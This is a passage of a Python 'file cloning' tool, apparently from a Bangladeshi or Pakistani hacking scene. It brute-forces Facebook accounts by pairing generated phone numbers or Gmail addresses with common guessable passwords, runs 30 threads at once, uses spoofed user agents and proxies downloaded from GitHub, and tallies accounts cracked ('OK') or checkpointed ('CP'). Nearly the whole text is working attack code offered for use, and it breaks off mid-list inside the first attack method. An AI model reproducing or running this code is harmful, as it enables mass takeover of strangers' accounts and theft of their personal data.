"""
Script open source by Mafia©
Orignal code of TRT
Github : Muzammil-404
Give credit to Mafia if you dont want to give credit
again look at your self """
#____________#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python trt.py')
	
print('[•] Join Our Group')
os.system('xdg-open https://facebook.com/groups/1267077887495034/')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

logo = """
\033[1;34m--------------------------------------------------
             

\033[1;33m     ███    ██  ██████  ██    ██  ██████  ███    ██ 
\033[1;31m     ████   ██ ██    ██  ██  ██  ██    ██ ████   ██ 
\033[1;32m     ██ ██  ██ ██    ██   ████   ██    ██ ██ ██  ██ 
\033[1;31m     ██  ██ ██ ██    ██    ██    ██    ██ ██  ██ ██ 
\033[1;34m     ██   ████  ██████     ██     ██████  ██   ████ 
                                               
                                               


-----------------🥰\033[1;32mNOYON FILE CLONING TOOLS🥰\033[1;34m---------------------
\033[1;34m🥀 AUTHOR     : \033[1;32mNOYON\033[1;34m
\033[1;34m🥀 FACEBOOK   : \033[1;32mMD KAMRUL HASAN NOYON
\033[1;34m🥀 GITHUB     : \033[1;32mKAMRULHN
\033[1;34m🥀 STATUS     : \033[1;32mTRIAL\033[1;34m
--------------------------------------------------
\033[1;34m🥀 VERSION    :\033[1;32m 1.5 \033[1;34m"DON'T WORRY FOR UPDATES!"\033[1;34m
\033[1;34m--------------------------------------------------"""
def linex():
	print('\033[1;34m--------------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
			clear()
		#	linex()
			print(' [1] Random cloning\n [2] File cloning\n [3] join whatsap group \n [0] Exit menu')
			linex()
			xd=input(' CHOOCE:\033[1;32m ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['2','02']:
				clear()
				print(' FILE NAME EXAMPLE : \033[1;32m /sdcard/File.txt  etc..')
				linex()
				file = input(' \033[1;34mFILE NAME \033[1;32m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' \033[1;31mFile location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' \033[1;34m[1] METHOD  \033[1;32m(MIX) \n\033[1;34m [2] METHOD \n [3]\033[1;34m METHOD   ')
				linex()
				mthd=input(' \033[1;34mCHOOCE:\033[1;32m ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' \033[1;34mHOW MANY PASSWORD DO YOU WANT TO ADD ?\033[1;32m '))
				except:
					ps_limit =1
				clear()
				print('\033[1;34m 🥀 EXAMPLE: \033[1;32mfirst last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' \033[1;34mPUT PASSWORD {i+1}:\033[1;32m '))
				clear()
				print(' \033[1;34mDO YOU WANT TO SHOW CP? \033[1;32m(y/n): ')
				linex()
				cx=input(' \033[1;34mCHOOSE:\033[1;32m ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print('🥀\033[1;34m TOTAL IDS : \033[1;32m'+total_ids+f' ')
					print('🥀\033[1;34m USE AIRPLAN MODE EVERY 5 MINUTES')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(api4,ids,names,passlist)
						elif mthd in ['5','05']:
							crack_submit.submit(api5,ids,names,passlist)
						elif mthd in ['6','06']:
							crack_submit.submit(api6,ids,names,passlist)
						elif mthd in ['7','07']:
							crack_submit.submit(api7,ids,names,passlist)
						elif mthd in ['8','08']:
							crack_submit.submit(api8,ids,names,passlist)
				print('\033[1;32m')
				linex()
				print(' \033[1;32mTHE PROCESS HAS COMPLETED')
				print(' \033[1;34mTOTAL OK|CP: \033[1;32m'+str(len(oks))+'\033[1;31m/ \033[1;34m'+str(len(cps)))
				linex()
				input(' \033[1;32mPress enter to back ')
				os.system('python trt.py')
			elif xd in ['1','01']:
				pak()
			elif xd in ['3','03']:
				gmail()
				#create()
				#dz._login()
				exit()
			elif xd in ['4','04']:
				os.system('xdg-open https://chat.whatsapp.com/GRCLEUOREdd1SDMTX1TsKk')
				menu()
			elif xd in ['0','00']:
				exit(' \033[1;32m THANKS FOR USE 🥰 ')
			else:
				exit(' \033[1;31m OPTION NOT FOUND...')
		
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (with cokies) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as TRT:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;34m CHOICE  :\033[1;32m '+code)
			print(' \033[1;34mUSE AIRPLAN MODE EVERY 5 MINUTES')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,ids[:6],ids[:7],ids[:8],ids[int(len(ids))-6:],'bangladesh','bangla','free fire','@@@###','sadiya','jannat']
				if pcs in ['2','02']:
					passlist = ['57273200']
				elif pcs in ['3','03']:
					passlist = [psx,ids,ids[:6],ids[:8]]
				elif pcs in ['4','04']:
					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
				elif pcs in ['5','05']:
					passlist = [psx,ids,'bangladesh','bangla','Bangla','free fire']
				elif pcs in ['6','06']:
					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
				elif pcs in ['7','07']:
					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				elif pcs in ['8','08']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
				if mthd in ['1','01']:
					TRT.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					TRT.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					TRT.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					TRT.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					TRT.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					TRT.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python trt.py')

def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com ')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 50000
		clear()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		clear()
		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as TRT:
			total = str(len(fo))
			clear()
			print(' Total ids : \033[1;32m'+total+f' ')
			print(' \033[1;34mGMAIL CLONE')
			print(' \033[1;34mCLONING STARTED')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs,fs+'@',fs+'@123',fs+'1',ls+'1',fs+'12',fs+'123456',ls,ls+'@',fs+'@@@',ls+'@@@',fs+'@#','@@@###',fs+'123',fs+'12345',fs+'1122',fs+'1234',ls+'12',ls+'12345',fs+fs,'free fire','57273200',fs+ls+'12',fs+ls+'@123',fs+ls+'@#']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					TRT.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					TRT.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					TRT.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					TRT.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					TRT.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					TRT.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python trt.py')
#b-api method
#1method
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;34m [NOYON-M1] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				uln = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'
				vk = random.choice(['4','5','6','7','8','9','10','11','12','13'])
				dvlk = random.choice(usr)
				gm = str(random.randint(111,999))
				gn = str(random.randint(111111,999999))
				vs = str(random.randint(5,13))
				ENH = ';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=782};FBLC/en_US;FBCR/cricket;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 520;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]'
				gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B